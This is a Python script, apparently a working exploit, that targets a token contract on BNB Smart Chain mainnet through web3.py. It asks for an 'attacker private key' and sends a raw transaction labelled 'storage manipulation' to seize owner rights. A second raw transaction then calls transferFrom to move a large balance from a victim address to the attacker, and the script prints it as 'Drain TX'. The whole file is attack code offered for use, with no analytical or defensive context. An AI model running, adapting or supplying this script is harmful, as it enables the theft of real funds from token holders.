from web3 import Web3
from web3.middleware import geth_poa_middleware
import argparse, getpass, time

def precise_exploit():
    parser = argparse.ArgumentParser()
    parser.add_argument('--rpc', default="https://bsc-dataseed.binance.org/")
    parser.add_argument('--token', required=True)
    parser.add_argument('--target', required=True)
    parser.add_argument('--attacker', required=True)
    args = parser.parse_args()

    w3 = Web3(Web3.HTTPProvider(args.rpc))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    private_key = getpass.getpass("Enter attacker private key: ")
    account = w3.eth.account.from_key(private_key)
    
    # ABI for balance check
    token_abi = [
        {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
        {"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
    ]
    token = w3.eth.contract(address=args.token, abi=token_abi)

    print("\n[Phase 1] Building raw transactions...")
    try:
        # 1. Prepare isOwner transaction
        isOwner_data = '0x6c8381f8' + args.attacker[2:].zfill(64)
        isOwner_tx = {
            'to': args.token,
            'data': isOwner_data,
            'gas': 250000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(args.attacker),
            'chainId': 56  # BSC chain ID
        }
        signed_isOwner = account.sign_transaction(isOwner_tx)
        
        # 2. Prepare transferFrom transaction
        decimals = token.functions.decimals().call()
        amount = int(10986854752264.367 * (10 ** decimals))
        transfer_data = '0x23b872dd' + \
                       args.target[2:].zfill(64) + \
                       args.attacker[2:].zfill(64) + \
                       hex(amount)[2:].zfill(64)
        transfer_tx = {
            'to': args.token,
            'data': transfer_data,
            'gas': 300000,
            'gasPrice': w3.eth.gas_price,
            'nonce': w3.eth.get_transaction_count(args.attacker) + 1,
            'chainId': 56
        }
        signed_transfer = account.sign_transaction(transfer_tx)

        print("\n[Phase 2] Executing exploit...")
        # Send first transaction
        tx_hash = w3.eth.send_raw_transaction(signed_isOwner.rawTransaction)
        print(f"Storage manipulation TX: {tx_hash.hex()}")
        
        # Wait for block confirmation
        time.sleep(15)
        
        # Send second transaction
        tx_hash = w3.eth.send_raw_transaction(signed_transfer.rawTransaction)
        print(f"Drain TX: {tx_hash.hex()}")

    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    precise_exploit()
